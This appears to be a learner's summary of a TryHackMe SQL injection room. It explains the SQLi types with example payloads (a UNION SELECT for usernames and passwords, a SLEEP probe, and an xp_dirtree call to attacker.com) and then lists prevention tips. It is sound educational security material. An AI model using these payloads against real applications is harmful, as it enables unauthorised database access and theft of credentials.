# TryHackMe: SQL Injection 

Room URL: https://tryhackme.com/room/sqlinjectionlm


# SQL Injection (SQLi) Summary

SQL Injection (SQLi) is a type of security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It is one of the most common and dangerous web vulnerabilities.

---

## Common SQLi Types

### 1. Classic (In-Band) SQL Injection

#### ➤ Explanation:
The attacker uses the same communication channel to both launch the attack and retrieve results.

#### ➤ Subtypes:
- **Error-Based SQLi**: Forces the database to generate error messages which reveal information.
- **Union-Based SQLi**: Uses the `UNION` SQL operator to combine results of two or more `SELECT` queries.

#### ➤ Example (Error-Based):
```sql
http://example.com/product?id=1' -- 
```
If vulnerable, it could generate an error like:
```
You have an error in your SQL syntax; check the manual...
```

#### ➤ Example (Union-Based):
```sql
http://example.com/product?id=1 UNION SELECT username, password FROM users --
```

---

### 2. Blind SQL Injection

#### ➤ Explanation:
The application does not show error messages. Instead, the attacker infers information based on application behavior.

#### ➤ Subtypes:
- **Boolean-Based (Content-Based)**: Sends a query that returns different results depending on whether the condition is true or false.
- **Time-Based**: Uses database time delay functions to infer information.

#### ➤ Example (Boolean-Based):
```sql
http://example.com/item?id=1' AND 1=1 -- (page loads normally)
http://example.com/item?id=1' AND 1=2 -- (different behavior or blank page)
```

#### ➤ Example (Time-Based):
```sql
http://example.com/item?id=1' AND IF(1=1, SLEEP(5), 0) -- 
```
Response is delayed = true condition confirmed.

---

### 3. Out-of-Band SQL Injection

#### ➤ Explanation:
Data is retrieved using a different channel (e.g., DNS or HTTP), often used when in-band is not possible.

#### ➤ Example:
```sql
'; EXEC xp_dirtree '\attacker.com\share' -- 
```
This may cause the database server to make an outbound connection to the attacker.

---

### 4. Second-Order SQL Injection

#### ➤ Explanation:
Malicious SQL code is stored in the database and later executed in a different context when retrieved.

#### ➤ Example:
```sql
-- User input in a form field:
username = "admin'--"

-- Later, when admin logs in, a query like:
SELECT * FROM users WHERE username = '$username'
-- becomes:
SELECT * FROM users WHERE username = 'admin'--'
```

---

## Prevention Tips

- Use **parameterized queries** (prepared statements).
- Employ **ORMs** (Object-Relational Mapping tools).
- Validate and sanitize all inputs.
- Implement **least privilege** database accounts.
- Use **Web Application Firewalls (WAFs)**.
- Monitor and log suspicious activity.

---

## References

- [OWASP SQL Injection Guide](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger Web Security Academy - SQLi](https://portswigger.net/web-security/sql-injection)
- [Acunetix - Types of SQL Injection](https://www.acunetix.com/blog/articles/sql-injection-types/)
- [Cheat Sheet Series: SQL Injection](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [SQL_Injection_Bypassing_WAF](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)

---
